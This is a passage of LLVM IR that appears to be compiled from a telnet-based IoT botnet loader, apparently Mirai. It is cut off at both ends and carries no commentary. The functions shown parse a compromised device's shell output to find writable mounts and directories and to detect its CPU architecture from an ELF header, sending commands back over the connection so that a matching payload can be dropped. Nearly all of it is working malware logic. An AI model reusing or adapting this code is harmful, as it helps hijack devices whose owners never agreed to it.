  %268 = load %struct.connection*, %struct.connection** %3, align 8
  %269 = getelementptr inbounds %struct.connection, %struct.connection* %268, i32 0, i32 15
  %270 = getelementptr inbounds [8192 x i8], [8192 x i8]* %269, i32 0, i32 0
  %271 = load i32, i32* %6, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8, i8* %270, i64 %272
  %274 = getelementptr inbounds i8, i8* %273, i64 1
  store i8* %274, i8** %5, align 8
  br label %275

; <label>:275:                                    ; preds = %267, %56
  br label %276

; <label>:276:                                    ; preds = %275, %50
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %6, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %6, align 4
  br label %27

; <label>:280:                                    ; preds = %38
  %281 = load i32, i32* %4, align 4
  %282 = icmp eq i32 %281, -1
  br i1 %282, label %283, label %310

; <label>:283:                                    ; preds = %280
  %284 = load %struct.connection*, %struct.connection** %3, align 8
  %285 = getelementptr inbounds %struct.connection, %struct.connection* %284, i32 0, i32 9
  %286 = load i16, i16* %285, align 8
  %287 = zext i16 %286 to i32
  %288 = icmp sgt i32 %287, 7168
  br i1 %288, label %289, label %309

; <label>:289:                                    ; preds = %283
  %290 = load %struct.connection*, %struct.connection** %3, align 8
  %291 = getelementptr inbounds %struct.connection, %struct.connection* %290, i32 0, i32 15
  %292 = getelementptr inbounds [8192 x i8], [8192 x i8]* %291, i32 0, i32 0
  %293 = load %struct.connection*, %struct.connection** %3, align 8
  %294 = getelementptr inbounds %struct.connection, %struct.connection* %293, i32 0, i32 15
  %295 = getelementptr inbounds [8192 x i8], [8192 x i8]* %294, i32 0, i32 0
  %296 = getelementptr inbounds i8, i8* %295, i64 6144
  %297 = load %struct.connection*, %struct.connection** %3, align 8
  %298 = getelementptr inbounds %struct.connection, %struct.connection* %297, i32 0, i32 9
  %299 = load i16, i16* %298, align 8
  %300 = zext i16 %299 to i32
  %301 = sub nsw i32 %300, 6144
  %302 = sext i32 %301 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %292, i8* %296, i64 %302, i32 1, i1 false)
  %303 = load %struct.connection*, %struct.connection** %3, align 8
  %304 = getelementptr inbounds %struct.connection, %struct.connection* %303, i32 0, i32 9
  %305 = load i16, i16* %304, align 8
  %306 = zext i16 %305 to i32
  %307 = sub nsw i32 %306, 6144
  %308 = trunc i32 %307 to i16
  store i16 %308, i16* %304, align 8
  br label %309

; <label>:309:                                    ; preds = %289, %283
  store i32 0, i32* %2, align 4
  br label %339

; <label>:310:                                    ; preds = %280
  store i32 0, i32* %6, align 4
  br label %311

; <label>:311:                                    ; preds = %334, %310
  %312 = load i32, i32* %6, align 4
  %313 = load %struct.connection*, %struct.connection** %3, align 8
  %314 = getelementptr inbounds %struct.connection, %struct.connection* %313, i32 0, i32 9
  %315 = load i16, i16* %314, align 8
  %316 = zext i16 %315 to i32
  %317 = icmp slt i32 %312, %316
  br i1 %317, label %318, label %337

; <label>:318:                                    ; preds = %311
  %319 = load %struct.connection*, %struct.connection** %3, align 8
  %320 = getelementptr inbounds %struct.connection, %struct.connection* %319, i32 0, i32 15
  %321 = load i32, i32* %6, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds [8192 x i8], [8192 x i8]* %320, i64 0, i64 %322
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 0
  br i1 %326, label %327, label %333

; <label>:327:                                    ; preds = %318
  %328 = load %struct.connection*, %struct.connection** %3, align 8
  %329 = getelementptr inbounds %struct.connection, %struct.connection* %328, i32 0, i32 15
  %330 = load i32, i32* %6, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [8192 x i8], [8192 x i8]* %329, i64 0, i64 %331
  store i8 32, i8* %332, align 1
  br label %333

; <label>:333:                                    ; preds = %327, %318
  br label %334

; <label>:334:                                    ; preds = %333
  %335 = load i32, i32* %6, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %6, align 4
  br label %311

; <label>:337:                                    ; preds = %311
  %338 = load i32, i32* %4, align 4
  store i32 %338, i32* %2, align 4
  br label %339

; <label>:339:                                    ; preds = %337, %309
  %340 = load i32, i32* %2, align 4
  ret i32 %340
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_mounts(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca [256 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %8, align 4
  %19 = load i32, i32* %8, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %163

; <label>:22:                                     ; preds = %1
  store i32 0, i32* %7, align 4
  br label %23

; <label>:23:                                     ; preds = %150, %22
  %24 = load i32, i32* %7, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %153

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 255
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  br label %153

; <label>:32:                                     ; preds = %27
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 10
  br i1 %40, label %41, label %93

; <label>:41:                                     ; preds = %32
  %42 = load i32, i32* %5, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %5, align 4
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i32 0, i32 0
  %47 = call i8* @strtok(i8* %46, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %48 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %48, i8** %9, align 8
  %49 = icmp eq i8* %48, null
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %41
  br label %92

; <label>:51:                                     ; preds = %41
  %52 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %53 = icmp eq i8* %52, null
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %51
  br label %92

; <label>:55:                                     ; preds = %51
  %56 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %56, i8** %10, align 8
  %57 = icmp eq i8* %56, null
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %55
  br label %92

; <label>:59:                                     ; preds = %55
  %60 = load i8*, i8** %9, align 8
  %61 = load i8*, i8** %9, align 8
  %62 = call i64 @strlen(i8* %61) #6
  %63 = sub i64 %62, 1
  %64 = getelementptr inbounds i8, i8* %60, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 47
  br i1 %67, label %68, label %74

; <label>:68:                                     ; preds = %59
  %69 = load i8*, i8** %9, align 8
  %70 = load i8*, i8** %9, align 8
  %71 = call i64 @strlen(i8* %70) #6
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  br label %74

; <label>:74:                                     ; preds = %68, %59
  %75 = load i8*, i8** %10, align 8
  %76 = load i8*, i8** %10, align 8
  %77 = call i64 @strlen(i8* %76) #6
  %78 = trunc i64 %77 to i32
  %79 = call i32 @util_memsearch(i8* %75, i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i32 2)
  %80 = icmp ne i32 %79, -1
  br i1 %80, label %81, label %91

; <label>:81:                                     ; preds = %74
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 4
  %84 = load i32, i32* %83, align 8
  %85 = load i8*, i8** %9, align 8
  %86 = load i8*, i8** %9, align 8
  %87 = load i8*, i8** %9, align 8
  %88 = load i8*, i8** %9, align 8
  %89 = load i8*, i8** %9, align 8
  %90 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %84, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* %85, i8* %86, i8* %87, i8* %88, i8* %89)
  br label %91

; <label>:91:                                     ; preds = %81, %74
  br label %92

; <label>:92:                                     ; preds = %91, %58, %54, %50
  store i32 0, i32* %5, align 4
  br label %149

; <label>:93:                                     ; preds = %32
  %94 = load %struct.connection*, %struct.connection** %3, align 8
  %95 = getelementptr inbounds %struct.connection, %struct.connection* %94, i32 0, i32 15
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [8192 x i8], [8192 x i8]* %95, i64 0, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 32
  br i1 %101, label %111, label %102

; <label>:102:                                    ; preds = %93
  %103 = load %struct.connection*, %struct.connection** %3, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 15
  %105 = load i32, i32* %7, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [8192 x i8], [8192 x i8]* %104, i64 0, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 9
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %102, %93
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %6, align 4
  %114 = icmp eq i32 %112, 0
  br i1 %114, label %115, label %126

; <label>:115:                                    ; preds = %111
  %116 = load %struct.connection*, %struct.connection** %3, align 8
  %117 = getelementptr inbounds %struct.connection, %struct.connection* %116, i32 0, i32 15
  %118 = load i32, i32* %7, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [8192 x i8], [8192 x i8]* %117, i64 0, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = load i32, i32* %5, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %5, align 4
  %124 = sext i32 %122 to i64
  %125 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %124
  store i8 %121, i8* %125, align 1
  br label %126

; <label>:126:                                    ; preds = %115, %111
  br label %148

; <label>:127:                                    ; preds = %102
  %128 = load %struct.connection*, %struct.connection** %3, align 8
  %129 = getelementptr inbounds %struct.connection, %struct.connection* %128, i32 0, i32 15
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [8192 x i8], [8192 x i8]* %129, i64 0, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp ne i32 %134, 13
  br i1 %135, label %136, label %147

; <label>:136:                                    ; preds = %127
  store i32 0, i32* %6, align 4
  %137 = load %struct.connection*, %struct.connection** %3, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 15
  %139 = load i32, i32* %7, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [8192 x i8], [8192 x i8]* %138, i64 0, i64 %140
  %142 = load i8, i8* %141, align 1
  %143 = load i32, i32* %5, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %5, align 4
  %145 = sext i32 %143 to i64
  %146 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %145
  store i8 %142, i8* %146, align 1
  br label %147

; <label>:147:                                    ; preds = %136, %127
  br label %148

; <label>:148:                                    ; preds = %147, %126
  br label %149

; <label>:149:                                    ; preds = %148, %92
  br label %150

; <label>:150:                                    ; preds = %149
  %151 = load i32, i32* %7, align 4
  %152 = add nsw i32 %151, 1
  store i32 %152, i32* %7, align 4
  br label %23

; <label>:153:                                    ; preds = %31, %23
  %154 = load %struct.connection*, %struct.connection** %3, align 8
  %155 = getelementptr inbounds %struct.connection, %struct.connection* %154, i32 0, i32 4
  %156 = load i32, i32* %155, align 8
  %157 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %156, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0))
  %158 = load %struct.connection*, %struct.connection** %3, align 8
  %159 = getelementptr inbounds %struct.connection, %struct.connection* %158, i32 0, i32 4
  %160 = load i32, i32* %159, align 8
  %161 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %160, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i32 0, i32 0))
  %162 = load i32, i32* %8, align 4
  store i32 %162, i32* %2, align 4
  br label %163

; <label>:163:                                    ; preds = %153, %21
  %164 = load i32, i32* %2, align 4
  ret i32 %164
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %7, align 4
  store i8 0, i8* %8, align 1
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %4, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %94

; <label>:21:                                     ; preds = %1
  br label %22

; <label>:22:                                     ; preds = %91, %49, %21
  %23 = load %struct.connection*, %struct.connection** %3, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 15
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i32 0, i32 0
  %26 = load i32, i32* %7, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %4, align 4
  %30 = load i32, i32* %7, align 4
  %31 = sub nsw i32 %29, %30
  %32 = call i32 @util_memsearch(i8* %28, i32 %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i32 0, i32 0), i32 4)
  store i32 %32, i32* %6, align 4
  %33 = load i32, i32* %6, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %22
  br label %92

; <label>:36:                                     ; preds = %22
  %37 = load i32, i32* %6, align 4
  %38 = load i32, i32* %7, align 4
  %39 = add nsw i32 %38, %37
  store i32 %39, i32* %7, align 4
  %40 = load %struct.connection*, %struct.connection** %3, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 15
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %41, i32 0, i32 0
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = call i8* @strtok(i8* %45, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0)) #5
  store i8* %46, i8** %9, align 8
  %47 = load i8*, i8** %9, align 8
  %48 = icmp eq i8* %47, null
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %36
  br label %22

; <label>:50:                                     ; preds = %36
  %51 = load i8*, i8** %9, align 8
  %52 = call i64 @strlen(i8* %51) #6
  %53 = trunc i64 %52 to i32
  store i32 %53, i32* %10, align 4
  %54 = load i8*, i8** %9, align 8
  %55 = load i32, i32* %10, align 4
  %56 = sub nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  br i1 %61, label %62, label %68

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %9, align 8
  %64 = load i32, i32* %10, align 4
  %65 = sub nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %63, i64 %66
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %62, %50
  %69 = load %struct.connection*, %struct.connection** %3, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 4
  %71 = load i32, i32* %70, align 8
  %72 = load i8*, i8** %9, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = load i8*, i8** %9, align 8
  %75 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %71, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i32 0, i32 0), i8* %72, i8* %73, i8* %74)
  %76 = load i8, i8* %8, align 1
  %77 = icmp ne i8 %76, 0
  br i1 %77, label %91, label %78

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* %10, align 4
  %80 = icmp slt i32 %79, 31
  br i1 %80, label %81, label %88

; <label>:81:                                     ; preds = %78
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 3
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 3
  %85 = getelementptr inbounds [32 x i8], [32 x i8]* %84, i32 0, i32 0
  %86 = load i8*, i8** %9, align 8
  %87 = call i8* @strcpy(i8* %85, i8* %86) #5
  store i8 1, i8* %8, align 1
  br label %90

; <label>:88:                                     ; preds = %78
  %89 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %89)
  br label %90

; <label>:90:                                     ; preds = %88, %81
  br label %91

; <label>:91:                                     ; preds = %90, %68
  br label %22

; <label>:92:                                     ; preds = %35
  %93 = load i32, i32* %4, align 4
  store i32 %93, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %92, %20
  %95 = load i32, i32* %2, align 4
  ret i32 %95
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_copy_op(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 3
  %9 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %8, i32 0, i32 8
  %10 = load i8, i8* %9, align 1
  %11 = icmp ne i8 %10, 0
  br i1 %11, label %217, label %12

; <label>:12:                                     ; preds = %1
  %13 = load %struct.connection*, %struct.connection** %3, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 15
  %15 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i32 0, i32 0
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 9
  %18 = load i16, i16* %17, align 8
  %19 = zext i16 %18 to i32
  %20 = call i32 @util_memsearch(i8* %15, i32 %19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i32 0, i32 0), i32 3)
  store i32 %20, i32* %5, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %12
  store i32 0, i32* %2, align 4
  br label %257

; <label>:23:                                     ; preds = %12
  %24 = load i32, i32* %5, align 4
  %25 = sub nsw i32 %24, 4
  store i32 %25, i32* %5, align 4
  %26 = load %struct.connection*, %struct.connection** %3, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = bitcast i8* %31 to %struct.elf_hdr*
  store %struct.elf_hdr* %32, %struct.elf_hdr** %4, align 8
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 3
  %35 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %34, i32 0, i32 8
  store i8 1, i8* %35, align 1
  %36 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %37 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %36, i32 0, i32 0
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %37, i64 0, i64 5
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  switch i32 %40, label %52 [
    i32 0, label %41
    i32 2, label %42
    i32 1, label %51
  ]

; <label>:41:                                     ; preds = %23
  store i32 0, i32* %2, align 4
  br label %257

; <label>:42:                                     ; preds = %23
  %43 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %44 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %43, i32 0, i32 2
  %45 = load i16, i16* %44, align 1
  %46 = zext i16 %45 to i32
  %47 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %46)
  %48 = trunc i32 %47 to i16
  %49 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %50 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %49, i32 0, i32 2
  store i16 %48, i16* %50, align 1
  br label %52

; <label>:51:                                     ; preds = %23
  br label %52

; <label>:52:                                     ; preds = %51, %42, %23
  %53 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %54 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %53, i32 0, i32 2
  %55 = load i16, i16* %54, align 1
  %56 = zext i16 %55 to i32
  %57 = icmp eq i32 %56, 40
  br i1 %57, label %64, label %58

; <label>:58:                                     ; preds = %52
  %59 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %60 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %59, i32 0, i32 2
  %61 = load i16, i16* %60, align 1
  %62 = zext i16 %61 to i32
  %63 = icmp eq i32 %62, 183
  br i1 %63, label %64, label %70

; <label>:64:                                     ; preds = %58, %52
  %65 = load %struct.connection*, %struct.connection** %3, align 8
  %66 = getelementptr inbounds %struct.connection, %struct.connection* %65, i32 0, i32 3
  %67 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %66, i32 0, i32 2
  %68 = getelementptr inbounds [6 x i8], [6 x i8]* %67, i32 0, i32 0
  %69 = call i8* @strcpy(i8* %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i32 0, i32 0)) #5
  br label %216

; <label>:70:                                     ; preds = %58
  %71 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %72 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %71, i32 0, i32 2
  %73 = load i16, i16* %72, align 1
  %74 = zext i16 %73 to i32
  %75 = icmp eq i32 %74, 8
  br i1 %75, label %82, label %76

; <label>:76:                                     ; preds = %70
  %77 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %78 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %77, i32 0, i32 2
  %79 = load i16, i16* %78, align 1
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 10
  br i1 %81, label %82, label %102

; <label>:82:                                     ; preds = %76, %70
  %83 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %84 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %83, i32 0, i32 0
  %85 = getelementptr inbounds [16 x i8], [16 x i8]* %84, i64 0, i64 5
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 1
  br i1 %88, label %89, label %95

; <label>:89:                                     ; preds = %82
  %90 = load %struct.connection*, %struct.connection** %3, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 3
  %92 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %91, i32 0, i32 2
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* %92, i32 0, i32 0
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #5
  br label %101

; <label>:95:                                     ; preds = %82
  %96 = load %struct.connection*, %struct.connection** %3, align 8
  %97 = getelementptr inbounds %struct.connection, %struct.connection* %96, i32 0, i32 3
  %98 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %97, i32 0, i32 2
  %99 = getelementptr inbounds [6 x i8], [6 x i8]* %98, i32 0, i32 0
  %100 = call i8* @strcpy(i8* %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0)) #5
  br label %101

; <label>:101:                                    ; preds = %95, %89
  br label %215

; <label>:102:                                    ; preds = %76
  %103 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %104 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %103, i32 0, i32 2
  %105 = load i16, i16* %104, align 1
  %106 = zext i16 %105 to i32
  %107 = icmp eq i32 %106, 3
  br i1 %107, label %126, label %108

; <label>:108:                                    ; preds = %102
  %109 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %110 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %109, i32 0, i32 2
  %111 = load i16, i16* %110, align 1
  %112 = zext i16 %111 to i32
  %113 = icmp eq i32 %112, 6
  br i1 %113, label %126, label %114

; <label>:114:                                    ; preds = %108
  %115 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %116 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %115, i32 0, i32 2
  %117 = load i16, i16* %116, align 1
  %118 = zext i16 %117 to i32
  %119 = icmp eq i32 %118, 7
  br i1 %119, label %126, label %120

; <label>:120:                                    ; preds = %114
  %121 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
